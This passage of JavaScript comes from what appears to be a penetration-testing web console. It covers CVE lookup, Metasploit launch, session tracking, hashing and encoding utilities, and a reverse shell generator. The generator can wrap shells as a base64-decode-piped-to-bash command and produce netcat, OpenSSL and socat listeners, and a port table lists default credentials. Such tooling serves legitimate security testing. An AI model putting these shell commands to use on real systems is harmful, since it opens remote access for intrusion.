                                    <i data-lucide="copy" class="w-3.5 h-3.5 inline-block"></i>
                                </button>
                                <button onclick="launchMetasploit('${escapeAttr(m.module)}', '${escapeAttr(cveId)}')" class="opacity-0 group-hover:opacity-100 px-1.5 py-0.5 bg-rose-600/80 hover:bg-rose-500 text-white rounded text-xs transition-all" title="Use in Metasploit">
                                    <i data-lucide="rocket" class="w-3.5 h-3.5 inline-block"></i>
                                </button>
                            </div>
                        `).join('')}
                    </div>
                </div>`;
            }

            let exploitBadge = c.exploit_available
                ? `<span class="px-1.5 py-0.5 rounded text-xs font-mono bg-rose-500/20 text-rose-400"><i data-lucide="skull" class="w-3 h-3 inline-block mr-0.5"></i> ${c.exploit_count} exploit${c.exploit_count > 1 ? 's' : ''}</span>`
                : '';

            return `<div class="p-3 rounded-lg bg-black/20 border border-white/5 hover:border-white/10 transition-colors">
                <div class="flex items-center gap-3 mb-1">
                    <code class="text-violet-300 font-mono text-sm font-medium">${escapeHtml(cveId)}</code>
                    <span class="px-1.5 py-0.5 rounded text-xs font-mono uppercase ${sevColor}">${escapeHtml(c.severity || 'unknown')}</span>
                    ${exploitBadge}
                    ${c.type ? `<span class="text-xs text-slate-500 font-mono">${escapeHtml(c.type)}</span>` : ''}
                    ${c.version_match ? '<span class="text-xs text-emerald-400 font-mono">version match</span>' : ''}
                </div>
                <p class="text-sm text-slate-300 line-clamp-2">${escapeHtml(c.description || '')}</p>
                ${c.product ? `<div class="text-xs text-slate-500 mt-1">${escapeHtml(c.product)} ${c.versions || ''}</div>` : ''}
                ${msfHtml}
            </div>`;
        }).join('');
    } catch (e) {
        results.innerHTML = `<div class="text-red-400 text-sm text-center py-4">Error: ${escapeHtml(e.message)}</div>`;
    } finally {
        btn.disabled = false;
        btn.innerHTML = '<i data-lucide="search" class="w-3.5 h-3.5 inline-block mr-1"></i> Search';
        if (typeof lucide !== 'undefined') lucide.createIcons();
    }
}

function quickRun(toolId) {
    const target = document.getElementById('global-target')?.value?.trim();
    if (!target) {
        _spectraToast('Enter a target first', 'warning');
        document.getElementById('global-target')?.focus();
        return;
    }
    switchManualTab('execute');
    selectManualTool(toolId);
    setTimeout(() => {
        const targetInput = document.getElementById('arg-target');
        if (targetInput) targetInput.value = target;
        executeManualTool();
    }, 400);
}

// === Tips System ===
const TIPS = [
    "Start with <b>Nmap</b> to discover open ports and services, then use the findings to target specific tools.",
    "After a port scan, use <b>SearchSploit</b> to find known exploits for discovered service versions.",
    "For web targets, run <b>WhatWeb</b> first to identify technologies, then <b>Nikto</b> or <b>Nuclei</b> for vulnerabilities.",
    "Use the <b>CVE Lookup</b> tab to search for known vulnerabilities by product name and version.",
    "The <b>Pipeline</b> tab lets you chain tools together. Use templates for common workflows.",
    "Click the action buttons on findings (hover to reveal) to quickly run follow-up tools.",
    "Create a <b>Session</b> to track all your findings, actions, and notes for reporting.",
    "For brute-force testing, manage wordlists in <b>Settings</b> and tools will auto-configure.",
    "Use <b>Nuclei</b> for comprehensive vulnerability scanning — it checks thousands of templates.",
    "The <b>{prev}</b> placeholder in pipelines passes the previous tool's output as the next tool's target.",
];
let tipIndex = Math.floor(Math.random() * TIPS.length);

function showTip() {
    document.getElementById('tip-text').innerHTML = TIPS[tipIndex % TIPS.length];
}
function nextTip() {
    tipIndex++;
    showTip();
}

// === Session Tracking ===
let currentSessionId = null;

async function startSession() {
    const target = document.getElementById('global-target')?.value?.trim() || 'unknown';
    _spectraPrompt('Session name:', (name) => {
        spectraApi.post('/api/v1/pentest-sessions', {name, target, description: ''}).then(res => {
            const session = res.data;
            currentSessionId = session.id;
            document.getElementById('session-label').textContent = `${name} (${target})`;
            document.getElementById('session-start-btn').textContent = 'Active';
            document.getElementById('session-start-btn').disabled = true;
            document.getElementById('session-export-btn').classList.remove('hidden');
        }).catch(e => { _spectraToast('Failed to start session', 'error'); });
    }, { title: 'Start Session', placeholder: `Pentest ${new Date().toLocaleDateString()}` });
}

function logToSession(action, tool, findings) {
    if (!currentSessionId) return;
    spectraApi.post(`/api/v1/pentest-sessions/${currentSessionId}/log`, {action, tool, note: '', findings: findings || []})
        .catch(e => console.debug('Session log failed:', e));
}

async function exportSession() {
    if (!currentSessionId) return;
    try {
        const res = await spectraApi.get(`/api/v1/pentest-sessions/${currentSessionId}/export`);
        const data = res.data;
        const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = `session-${currentSessionId}.json`;
        a.click();
    } catch (e) {
        _spectraToast('Export failed: ' + e.message, 'error');
    }
}

// === Launch Metasploit from CVE ===
function launchMetasploit(modulePath, cveId) {
    switchManualTab('execute');
    selectManualTool('metasploit');
    setTimeout(() => {
        const target = document.getElementById('global-target')?.value || '';
        const targetInput = document.getElementById('arg-target');
        if (targetInput && target) targetInput.value = target;
        const moduleInput = document.getElementById('arg-module') || document.getElementById('arg-resource');
        if (moduleInput) moduleInput.value = modulePath;
    }, 400);
}

// === Helper Sub-Tab Switching ===
let activeHelperTab = 'revshell';
function switchHelperTab(tab) {
    activeHelperTab = tab;
    document.querySelectorAll('.helper-tab-btn').forEach(b => {
        const isActive = b.onclick && b.onclick.toString().includes("'" + tab + "'");
        if (isActive) {
            b.className = 'helper-tab-btn active px-3 py-2 text-xs font-medium text-violet-400 border-b-2 border-violet-500 whitespace-nowrap';
        } else {
            b.className = 'helper-tab-btn px-3 py-2 text-xs font-medium text-slate-400 border-b-2 border-transparent hover:text-white whitespace-nowrap';
        }
    });
    document.querySelectorAll('.helper-panel').forEach(p => p.classList.add('hidden'));
    const panel = document.getElementById('helper-' + tab);
    if (panel) panel.classList.remove('hidden');
}

// === Reverse Shell Generator ===
let activeShellCategory = 'all';
let selectedShellIdx = null;

function initRevShells() {
    const filterContainer = document.getElementById('revshell-cat-filters');
    filterContainer.innerHTML = SHELL_CATEGORIES.map(c =>
        `<button onclick="filterShells('${c.id}')" class="revshell-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${
            c.id === 'all' ? 'bg-violet-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-violet-500/10 border border-white/5'
        }" data-cat="${c.id}">${c.label}</button>`
    ).join('');
    filterShells('all');
}

function filterShells(cat) {
    activeShellCategory = cat;
    document.querySelectorAll('.revshell-cat-btn').forEach(b => {
        const isActive = b.dataset.cat === cat;
        b.className = `revshell-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${isActive ? 'bg-violet-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-violet-500/10 border border-white/5'}`;
    });
    renderShellList();
}

function renderShellList() {
    const shells = activeShellCategory === 'all' ? REVERSE_SHELLS : REVERSE_SHELLS.filter(s => s.category === activeShellCategory);
    let currentCat = '';
    let html = '';
    shells.forEach((s, i) => {
        const realIdx = REVERSE_SHELLS.indexOf(s);
        if (activeShellCategory === 'all' && s.category !== currentCat) {
            currentCat = s.category;
            const catLabel = SHELL_CATEGORIES.find(c => c.id === currentCat)?.label || currentCat;
            html += `<div class="text-xs font-bold uppercase text-slate-500 mt-2 mb-1">${escapeHtml(catLabel)}</div>`;
        }
        const sel = realIdx === selectedShellIdx ? 'bg-violet-500/10 border-violet-500/30' : 'bg-white/[0.02] border-white/5 hover:bg-white/[0.05]';
        html += `<div class="flex items-center gap-2 px-2.5 py-1.5 rounded border cursor-pointer ${sel}" onclick="selectShell(${realIdx})">
            <span class="text-xs text-white font-medium">${escapeHtml(s.name)}</span>
            <span class="text-xs text-slate-500 truncate flex-1">${escapeHtml(s.description)}</span>
        </div>`;
    });
    document.getElementById('revshell-list').innerHTML = html;
}

function selectShell(idx) {
    selectedShellIdx = idx;
    renderShellList();
    genRevShell(idx);
}

function genRevShell(idx) {
    const shell = REVERSE_SHELLS[idx];
    if (!shell) return;
    const ip = document.getElementById('revshell-ip')?.value || '10.0.0.1';
    const port = document.getElementById('revshell-port')?.value || '4444';
    let output = shell.template.replace(/\{ip\}/g, ip).replace(/\{port\}/g, port);
    if (document.getElementById('revshell-b64wrap')?.checked && !['stabilize','listeners','web'].includes(shell.category)) {
        const b64 = btoa(output);
        output = `echo ${b64} | base64 -d | bash`;
    }
    document.getElementById('revshell-output').textContent = output;
    const listenerBtn = document.getElementById('revshell-copy-listener');
    if (listenerBtn) {
        listenerBtn.classList.toggle('hidden', ['stabilize','listeners','web'].includes(shell.category));
    }
}

function copyListenerCmd() {
    const port = document.getElementById('revshell-port')?.value || '4444';
    const shell = selectedShellIdx !== null ? REVERSE_SHELLS[selectedShellIdx] : null;
    let listener = `nc -lvnp ${port}`;
    if (shell) {
        if (shell.category === 'encrypted' && shell.name.includes('OpenSSL')) {
            listener = `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 1 -nodes 2>/dev/null && openssl s_server -quiet -key key.pem -cert cert.pem -port ${port}`;
        } else if (shell.category === 'encrypted' && shell.name.includes('Ncat')) {
            listener = `ncat --ssl -lvnp ${port}`;
        } else if (shell.category === 'encrypted' && shell.name.includes('Socat')) {
            listener = 'socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:' + port + ',reuseaddr,cert=cert.pem,key=key.pem,verify=0';
        } else if (shell.name.includes('Socat')) {
            listener = 'socat file:`tty`,raw,echo=0 TCP-L:' + port;
        }
    }
    navigator.clipboard.writeText(listener);
}

// === Encoder/Decoder ===
let activeEncoderCategory = 'all';

function initEncoder() {
    const filterContainer = document.getElementById('encoder-cat-filters');
    filterContainer.innerHTML = ENCODER_CATEGORIES.map(c =>
        `<button onclick="filterEncoder('${c.id}')" class="encoder-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${
            c.id === 'all' ? 'bg-blue-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-blue-500/10 border border-white/5'
        }" data-cat="${c.id}">${c.label}</button>`
    ).join('');
    filterEncoder('all');
}

function filterEncoder(cat) {
    activeEncoderCategory = cat;
    document.querySelectorAll('.encoder-cat-btn').forEach(b => {
        const isActive = b.dataset.cat === cat;
        b.className = `encoder-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${isActive ? 'bg-blue-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-blue-500/10 border border-white/5'}`;
    });
    renderEncoderOps();
}

function renderEncoderOps() {
    const ops = activeEncoderCategory === 'all' ? ENCODER_OPERATIONS : ENCODER_OPERATIONS.filter(o => o.category === activeEncoderCategory);
    document.getElementById('encoder-ops').innerHTML = ops.map(o =>
        `<button onclick="runEncoder('${o.fn_name}')" class="px-2.5 py-1 bg-slate-800 hover:bg-blue-500/10 border border-white/5 rounded text-[11px] text-slate-300 transition-colors" title="${escapeAttr(o.description)}">${escapeHtml(o.name)}</button>`
    ).join('');
}

async function runEncoder(fnName) {
    const input = document.getElementById('encode-input')?.value || '';
    const out = document.getElementById('encode-output');
    if (!input && !['randomPassword','timestampConvert'].includes(fnName)) { out.textContent = 'Enter text first'; return; }
    try {
        const result = await encoderFunctions[fnName](input);
        out.textContent = typeof result === 'object' ? JSON.stringify(result, null, 2) : result;
    } catch(e) { out.textContent = 'Error: ' + e.message; }
}

function copyToClipboard(elemId) {
    const text = document.getElementById(elemId)?.textContent || '';
    navigator.clipboard.writeText(text);
}

// ---- Pure JS MD5 (RFC 1321) ----
function md5(input) {
    function md5cycle(x, k) {
        let a = x[0], b = x[1], c = x[2], d = x[3];
        a = ff(a,b,c,d,k[0],7,-680876936);d=ff(d,a,b,c,k[1],12,-389564586);c=ff(c,d,a,b,k[2],17,606105819);b=ff(b,c,d,a,k[3],22,-1044525330);
        a=ff(a,b,c,d,k[4],7,-176418897);d=ff(d,a,b,c,k[5],12,1200080426);c=ff(c,d,a,b,k[6],17,-1473231341);b=ff(b,c,d,a,k[7],22,-45705983);
        a=ff(a,b,c,d,k[8],7,1770035416);d=ff(d,a,b,c,k[9],12,-1958414417);c=ff(c,d,a,b,k[10],17,-42063);b=ff(b,c,d,a,k[11],22,-1990404162);
        a=ff(a,b,c,d,k[12],7,1804603682);d=ff(d,a,b,c,k[13],12,-40341101);c=ff(c,d,a,b,k[14],17,-1502002290);b=ff(b,c,d,a,k[15],22,1236535329);
        a=gg(a,b,c,d,k[1],5,-165796510);d=gg(d,a,b,c,k[6],9,-1069501632);c=gg(c,d,a,b,k[11],14,643717713);b=gg(b,c,d,a,k[0],20,-373897302);
        a=gg(a,b,c,d,k[5],5,-701558691);d=gg(d,a,b,c,k[10],9,38016083);c=gg(c,d,a,b,k[15],14,-660478335);b=gg(b,c,d,a,k[4],20,-405537848);
        a=gg(a,b,c,d,k[9],5,568446438);d=gg(d,a,b,c,k[14],9,-1019803690);c=gg(c,d,a,b,k[3],14,-187363961);b=gg(b,c,d,a,k[8],20,1163531501);
        a=gg(a,b,c,d,k[13],5,-1444681467);d=gg(d,a,b,c,k[2],9,-51403784);c=gg(c,d,a,b,k[7],14,1735328473);b=gg(b,c,d,a,k[12],20,-1926607734);
        a=hh(a,b,c,d,k[5],4,-378558);d=hh(d,a,b,c,k[8],11,-2022574463);c=hh(c,d,a,b,k[11],16,1839030562);b=hh(b,c,d,a,k[14],23,-35309556);
        a=hh(a,b,c,d,k[1],4,-1530992060);d=hh(d,a,b,c,k[4],11,1272893353);c=hh(c,d,a,b,k[7],16,-155497632);b=hh(b,c,d,a,k[10],23,-1094730640);
        a=hh(a,b,c,d,k[13],4,681279174);d=hh(d,a,b,c,k[0],11,-358537222);c=hh(c,d,a,b,k[3],16,-722521979);b=hh(b,c,d,a,k[6],23,76029189);
        a=hh(a,b,c,d,k[9],4,-640364487);d=hh(d,a,b,c,k[12],11,-421815835);c=hh(c,d,a,b,k[15],16,530742520);b=hh(b,c,d,a,k[2],23,-995338651);
        a=ii(a,b,c,d,k[0],6,-198630844);d=ii(d,a,b,c,k[7],10,1126891415);c=ii(c,d,a,b,k[14],15,-1416354905);b=ii(b,c,d,a,k[5],21,-57434055);
        a=ii(a,b,c,d,k[12],6,1700485571);d=ii(d,a,b,c,k[3],10,-1894986606);c=ii(c,d,a,b,k[10],15,-1051523);b=ii(b,c,d,a,k[1],21,-2054922799);
        a=ii(a,b,c,d,k[8],6,1873313359);d=ii(d,a,b,c,k[15],10,-30611744);c=ii(c,d,a,b,k[6],15,-1560198380);b=ii(b,c,d,a,k[13],21,1309151649);
        a=ii(a,b,c,d,k[4],6,-145523070);d=ii(d,a,b,c,k[11],10,-1120210379);c=ii(c,d,a,b,k[2],15,718787259);b=ii(b,c,d,a,k[9],21,-343485551);
        x[0]=add32(a,x[0]);x[1]=add32(b,x[1]);x[2]=add32(c,x[2]);x[3]=add32(d,x[3]);
    }
    function cmn(q,a,b,x,s,t){a=add32(add32(a,q),add32(x,t));return add32((a<<s)|(a>>>(32-s)),b);}
    function ff(a,b,c,d,x,s,t){return cmn((b&c)|((~b)&d),a,b,x,s,t);}
    function gg(a,b,c,d,x,s,t){return cmn((b&d)|(c&(~d)),a,b,x,s,t);}
    function hh(a,b,c,d,x,s,t){return cmn(b^c^d,a,b,x,s,t);}
    function ii(a,b,c,d,x,s,t){return cmn(c^(b|(~d)),a,b,x,s,t);}
    function add32(a,b){return (a+b)&0xFFFFFFFF;}
    function md5blk(s){
        const md5blks=[];for(let i=0;i<64;i+=4)md5blks[i>>2]=s.charCodeAt(i)+(s.charCodeAt(i+1)<<8)+(s.charCodeAt(i+2)<<16)+(s.charCodeAt(i+3)<<24);
        return md5blks;
    }
    let n=input.length,state=[1732584193,-271733879,-1732584194,271733878],i;
    for(i=64;i<=n;i+=64)md5cycle(state,md5blk(input.substring(i-64,i)));
    input=input.substring(i-64);
    const tail=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];
    for(i=0;i<input.length;i++)tail[i>>2]|=input.charCodeAt(i)<<((i%4)<<3);
    tail[i>>2]|=0x80<<((i%4)<<3);
    if(i>55){md5cycle(state,tail);for(i=0;i<16;i++)tail[i]=0;}
    tail[14]=n*8;
    md5cycle(state,tail);
    const hex_chr='0123456789abcdef';
    let s='';
    for(i=0;i<4;i++)for(let j=0;j<4;j++)s+=hex_chr[(state[i]>>(j*8+4))&0x0F]+hex_chr[(state[i]>>(j*8))&0x0F];
    return s;
}

// ---- Pure JS MD4 (for NTLM) ----
function md4(input) {
    function add32(a,b){return (a+b)&0xFFFFFFFF;}
    function rotl(v,s){return (v<<s)|(v>>>(32-s));}
    function f(x,y,z){return (x&y)|((~x)&z);}
    function g(x,y,z){return (x&y)|(x&z)|(y&z);}
    function h(x,y,z){return x^y^z;}
    const n = input.length;
    let words = [];
    for(let i=0;i<n;i+=4) words.push((input.charCodeAt(i)||0)+((input.charCodeAt(i+1)||0)<<8)+((input.charCodeAt(i+2)||0)<<16)+((input.charCodeAt(i+3)||0)<<24));
    const totalBits = n * 8;
    words[n>>2] |= 0x80 << ((n%4)*8);
    while(words.length % 16 !== 14) words.push(0);
    words.push(totalBits & 0xFFFFFFFF, 0);
    let a0=0x67452301,b0=0xEFCDAB89,c0=0x98BADCFE,d0=0x10325476;
    for(let i=0;i<words.length;i+=16){
        const x=words.slice(i,i+16);
        let a=a0,b=b0,c=c0,d=d0;
        const S=[3,7,11,19], O1=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15];
        for(let j=0;j<16;j++){a=rotl(add32(add32(a,f(b,c,d)),x[O1[j]]),S[j%4]);const t=a;a=d;d=c;c=b;b=t;}
        const S2=[3,5,9,13], O2=[0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15];
        for(let j=0;j<16;j++){a=rotl(add32(add32(add32(a,g(b,c,d)),x[O2[j]]),0x5A827999),S2[j%4]);const t=a;a=d;d=c;c=b;b=t;}
        const S3=[3,9,11,15], O3=[0,8,4,12,2,10,6,14,1,9,5,13,3,11,7,15];
        for(let j=0;j<16;j++){a=rotl(add32(add32(add32(a,h(b,c,d)),x[O3[j]]),0x6ED9EBA1),S3[j%4]);const t=a;a=d;d=c;c=b;b=t;}
        a0=add32(a0,a);b0=add32(b0,b);c0=add32(c0,c);d0=add32(d0,d);
    }
    const hex_chr='0123456789abcdef';
    let s='';
    [a0,b0,c0,d0].forEach(v=>{for(let j=0;j<4;j++)s+=hex_chr[(v>>(j*8+4))&0xF]+hex_chr[(v>>(j*8))&0xF];});
    return s;
}

// ---- Crypto.subtle hash helper ----
async function hashDigest(algo, text) {
    const buf = await crypto.subtle.digest(algo, new TextEncoder().encode(text));
    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
}

// ---- Base32 ----
function base32Encode(input) {
    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    const bytes = new TextEncoder().encode(input);
    let bits = '', result = '';
    for (const b of bytes) bits += b.toString(2).padStart(8, '0');
    while (bits.length % 5 !== 0) bits += '0';
    for (let i = 0; i < bits.length; i += 5) result += alphabet[parseInt(bits.slice(i, i+5), 2)];
    while (result.length % 8 !== 0) result += '=';
    return result;
}

function base32Decode(input) {
    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    const cleaned = input.replace(/=+$/, '').toUpperCase();
    let bits = '';
    for (const c of cleaned) {
        const idx = alphabet.indexOf(c);
        if (idx === -1) throw new Error('Invalid Base32 character: ' + c);
        bits += idx.toString(2).padStart(5, '0');
    }
    const bytes = [];
    for (let i = 0; i + 8 <= bits.length; i += 8) bytes.push(parseInt(bits.slice(i, i+8), 2));
    return new TextDecoder().decode(new Uint8Array(bytes));
}

// ---- Encoder Functions Map ----
const encoderFunctions = {
    base64Encode: (input) => btoa(unescape(encodeURIComponent(input))),
    base64Decode: (input) => decodeURIComponent(escape(atob(input.trim()))),
    urlEncode: (input) => encodeURIComponent(input),
    urlDecode: (input) => decodeURIComponent(input),
    hexEncode: (input) => Array.from(new TextEncoder().encode(input)).map(b => b.toString(16).padStart(2,'0')).join(''),
    hexDecode: (input) => {
        const hex = input.replace(/\s+/g,'');
        const bytes = [];
        for(let i=0;i<hex.length;i+=2) bytes.push(parseInt(hex.substr(i,2),16));
        return new TextDecoder().decode(new Uint8Array(bytes));
    },
    htmlEncode: (input) => input.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[c])),
    htmlDecode: (input) => { const d=document.createElement('div'); d.innerHTML=input; return d.textContent; },
    base32Encode: (input) => base32Encode(input),
    base32Decode: (input) => base32Decode(input),
    binaryEncode: (input) => Array.from(new TextEncoder().encode(input)).map(b => b.toString(2).padStart(8,'0')).join(' '),
    binaryDecode: (input) => {
        const bytes = input.trim().split(/\s+/).map(b => parseInt(b, 2));
        return new TextDecoder().decode(new Uint8Array(bytes));
    },
    decimalEncode: (input) => Array.from(new TextEncoder().encode(input)).map(b => b.toString(10)).join(' '),
    decimalDecode: (input) => {
        const bytes = input.trim().split(/\s+/).map(b => parseInt(b, 10));
        return new TextDecoder().decode(new Uint8Array(bytes));
    },
    rot13: (input) => input.replace(/[a-zA-Z]/g, c => {
        const base = c <= 'Z' ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
    }),
    rot47: (input) => input.replace(/[!-~]/g, c => String.fromCharCode(33 + ((c.charCodeAt(0) - 33 + 47) % 94))),
    unicodeEscape: (input) => Array.from(input).map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4,'0')).join(''),
    unicodeUnescape: (input) => input.replace(/\\u([0-9a-fA-F]{4})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16))),
    md5Hash: (input) => md5(input),
    sha1Hash: async (input) => await hashDigest('SHA-1', input),
    sha256Hash: async (input) => await hashDigest('SHA-256', input),
    sha512Hash: async (input) => await hashDigest('SHA-512', input),
    ntlmHash: (input) => {
        // NTLM = MD4(UTF-16LE(password))
        let utf16le = '';
        for (let i = 0; i < input.length; i++) {
            const code = input.charCodeAt(i);
            utf16le += String.fromCharCode(code & 0xFF) + String.fromCharCode((code >> 8) & 0xFF);
        }
        return md4(utf16le);
    },
    jwtDecode: (input) => {
        const parts = input.trim().split('.');
        if (parts.length < 2) throw new Error('Invalid JWT: need at least header.payload');
        const b64url = s => atob(s.replace(/-/g,'+').replace(/_/g,'/').replace(/\s/g,''));
        const header = JSON.parse(b64url(parts[0]));
        const payload = JSON.parse(b64url(parts[1]));
        return { header, payload };
    },
    xorEncrypt: (input) => {
        const key = document.getElementById('encode-key')?.value || 'key';
        let result = '';
        for (let i = 0; i < input.length; i++) {
            result += (input.charCodeAt(i) ^ key.charCodeAt(i % key.length)).toString(16).padStart(2,'0');
        }
        return result;
    },
    ipConvert: (input) => {
        const trimmed = input.trim();
        let decimal;
        if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(trimmed)) {
            const parts = trimmed.split('.').map(Number);
            decimal = ((parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]) >>> 0;
        } else if (/^0x/i.test(trimmed)) {
            decimal = parseInt(trimmed, 16) >>> 0;
        } else if (/^0/.test(trimmed) && /^[0-7.]+$/.test(trimmed)) {
            decimal = parseInt(trimmed, 8) >>> 0;
        } else {
            decimal = parseInt(trimmed, 10) >>> 0;
        }
        const d = [(decimal>>>24)&0xFF,(decimal>>>16)&0xFF,(decimal>>>8)&0xFF,decimal&0xFF];
        return `Dotted:  ${d.join('.')}\nDecimal: ${decimal}\nHex:     0x${decimal.toString(16).padStart(8,'0')}\nOctal:   0${d.map(b=>'0'+b.toString(8)).join('.')}`;
    },
    timestampConvert: (input) => {
        const trimmed = input.trim();
        if (/^\d{8,}$/.test(trimmed)) {
            const ts = parseInt(trimmed);
            const d = ts > 1e12 ? new Date(ts) : new Date(ts * 1000);
            return `UTC:   ${d.toUTCString()}\nLocal: ${d.toLocaleString()}\nISO:   ${d.toISOString()}`;
        }
        const d = new Date(trimmed || Date.now());
        if (isNaN(d.getTime())) throw new Error('Invalid date');
        return `Epoch (s):  ${Math.floor(d.getTime()/1000)}\nEpoch (ms): ${d.getTime()}\nISO:        ${d.toISOString()}\nUTC:        ${d.toUTCString()}`;
    },
    regexTest: (input) => {
        const key = document.getElementById('encode-key')?.value || '.*';
        const re = new RegExp(key, 'gm');
        const matches = [];
        let m;
        while ((m = re.exec(input)) !== null) {
            matches.push({ match: m[0], index: m.index, groups: m.slice(1) });
            if (m[0].length === 0) re.lastIndex++;
        }
        if (!matches.length) return 'No matches';
        return `${matches.length} match(es):\n` + matches.map((m, i) => `[${i}] "${m.match}" at index ${m.index}${m.groups.length ? ' groups: ' + JSON.stringify(m.groups) : ''}`).join('\n');
    },
    randomPassword: () => {
        const len = parseInt(document.getElementById('encode-input')?.value) || 16;
        const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
        const arr = new Uint32Array(len);
        crypto.getRandomValues(arr);
        return Array.from(arr, v => charset[v % charset.length]).join('');
    },
    reverseString: (input) => [...input].reverse().join(''),
    toUpperCase: (input) => input.toUpperCase(),
    toLowerCase: (input) => input.toLowerCase(),
    swapCase: (input) => input.replace(/[a-zA-Z]/g, c => c === c.toUpperCase() ? c.toLowerCase() : c.toUpperCase()),
    charCount: (input) => {
        const bytes = new TextEncoder().encode(input).length;
        return `Characters: ${input.length}\nBytes (UTF-8): ${bytes}\nWords: ${input.trim().split(/\s+/).filter(Boolean).length}\nLines: ${input.split('\n').length}`;
    },
    urlParse: (input) => {
        try {
            const u = new URL(input);
            return `Protocol: ${u.protocol}\nHost:     ${u.host}\nHostname: ${u.hostname}\nPort:     ${u.port || '(default)'}\nPathname: ${u.pathname}\nSearch:   ${u.search}\nHash:     ${u.hash}\nOrigin:   ${u.origin}`;
        } catch { return 'Invalid URL'; }
    },
};

// === Port Reference ===
let activePortCategory = 'all';

function initPorts() {
    const filterContainer = document.getElementById('port-cat-filters');
    filterContainer.innerHTML = PORT_CATEGORIES.map(c =>
        `<button onclick="filterPortCat('${c.id}')" class="port-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${
            c.id === 'all' ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-emerald-500/10 border border-white/5'
        }" data-cat="${c.id}">${c.label}</button>`
    ).join('');
    renderPorts(PORT_REFERENCE);
}

function filterPortCat(cat) {
    activePortCategory = cat;
    document.querySelectorAll('.port-cat-btn').forEach(b => {
        const isActive = b.dataset.cat === cat;
        b.className = `port-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${isActive ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-emerald-500/10 border border-white/5'}`;
    });
    filterPorts();
}

function renderPorts(ports) {
    document.getElementById('port-count').textContent = ports.length + ' ports';
    document.getElementById('port-list').innerHTML = ports.map(p => {
        const vulnClass = p.common_vulns.includes('RCE') || p.common_vulns.includes('CVE') ? 'text-rose-400' : 'text-amber-400/80';
        const toolLinks = p.tools.split(', ').map(t => `<span class="text-violet-400 hover:text-violet-300 cursor-pointer" onclick="jumpToTool('${escapeAttr(t.trim())}')">${escapeHtml(t.trim())}</span>`).join(', ');
        return `<tr class="border-b border-white/[0.03] hover:bg-white/[0.03]">
            <td class="px-2 py-1.5 text-violet-400 font-bold">${p.port}</td>
            <td class="px-2 py-1.5 text-emerald-400">${escapeHtml(p.service)}</td>
            <td class="px-2 py-1.5 text-slate-500">${p.protocol}</td>
            <td class="px-2 py-1.5 text-slate-400">${escapeHtml(p.default_creds)}</td>
            <td class="px-2 py-1.5 ${vulnClass}">${escapeHtml(p.common_vulns)}</td>
            <td class="px-2 py-1.5">${toolLinks}</td>
        </tr>`;
    }).join('');
}

function filterPorts() {
    const q = document.getElementById('port-search')?.value?.toLowerCase() || '';
    let ports = PORT_REFERENCE;
    if (activePortCategory !== 'all') ports = ports.filter(p => p.category === activePortCategory);
    if (q) {
        ports = ports.filter(p =>
            p.port.toString().includes(q) || p.service.toLowerCase().includes(q) ||
            p.common_vulns.toLowerCase().includes(q) || p.tools.toLowerCase().includes(q) ||
            p.default_creds.toLowerCase().includes(q) || p.protocol.toLowerCase().includes(q)
        );
    }
    renderPorts(ports);
}

function jumpToTool(toolName) {
    switchManualTab('execute');
    const searchInput = document.getElementById('tool-search');
    if (searchInput) { searchInput.value = toolName; filterTools(); }
    const match = allTools.find(t => t.name.toLowerCase() === toolName.toLowerCase() || t.id.toLowerCase() === toolName.toLowerCase());
    if (match) setTimeout(() => selectManualTool(match.id), 200);
}

// === Wordlist Management ===
async function loadWordlists() {
    try {
        const { data, error } = await spectraApi.get('/api/v1/wordlists');
        const wordlists = data?.wordlists || data?.local || [];
        const presets = data?.presets || [];

        let html = '';
        if (wordlists.length) {
            html += wordlists.map(w => `
                <div class="flex items-center gap-2 text-xs px-2 py-1.5 rounded bg-white/[0.02] hover:bg-white/[0.05] group">
                    <i data-lucide="file-text" class="w-4 h-4 inline-block text-amber-400/60 shrink-0"></i>
                    <span class="text-white truncate flex-1 font-mono">${escapeHtml(w.name || w)}</span>
                    ${w.size ? `<span class="text-slate-500 text-xs shrink-0">${w.size}</span>` : ''}
                    <button onclick="navigator.clipboard.writeText('${escapeAttr(w.path || w.name || w)}')" class="opacity-0 group-hover:opacity-100 text-slate-400 hover:text-white transition-all" title="Copy path"><i data-lucide="copy" class="w-3.5 h-3.5 inline-block"></i></button>
                </div>
            `).join('');
        }

        if (presets.length) {
            html += '<div class="text-xs text-slate-500 uppercase font-bold mt-3 mb-1">Available for Download</div>';
            html += presets.map(p => `
                <div class="flex items-center gap-2 text-xs px-2 py-1.5 rounded bg-white/[0.02] ${p.downloaded ? 'opacity-50' : 'hover:bg-white/[0.05]'}">
                    <i data-lucide="download" class="w-4 h-4 inline-block text-blue-400/60 shrink-0"></i>
